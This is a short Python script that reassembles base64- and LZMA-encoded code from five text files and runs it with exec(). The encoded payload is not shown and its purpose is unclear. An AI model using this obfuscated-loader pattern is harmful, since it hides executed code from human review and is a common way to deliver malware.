#!/usr/bin/env python3
from pathlib import Path
import base64
import lzma

root = Path(__file__).with_name("parity_payload")
payload = "".join((root / f"{i:02}.txt").read_text(encoding="utf-8").strip() for i in range(5))
code = lzma.decompress(base64.b64decode(payload)).decode("utf-8")
exec(compile(code, __file__, "exec"))
